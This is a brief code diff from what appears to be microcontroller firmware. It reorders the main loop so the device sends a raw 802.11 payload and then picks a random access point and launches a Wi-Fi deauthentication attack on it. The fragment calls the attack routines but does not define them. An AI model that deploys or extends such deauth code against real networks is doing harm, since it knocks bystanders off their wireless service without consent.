@@ -113,11 +113,11 @@ void decompressPayload(const char* input, char* output) {
 
 // this is the looping function that sends the payload
 void loop() {
-    // get random ap
-    deauthAttack.selectRandomAP();
     // send payload
     Raw80211::send(reinterpret_cast<const uint8_t*>(jsonPayload), strlen(jsonPayload));
     delay(5000);
+    // get random ap
+    deauthAttack.selectRandomAP();
     // deauthing the ap
     deauthAttack.startRandomDeauth();
     delay(5000);
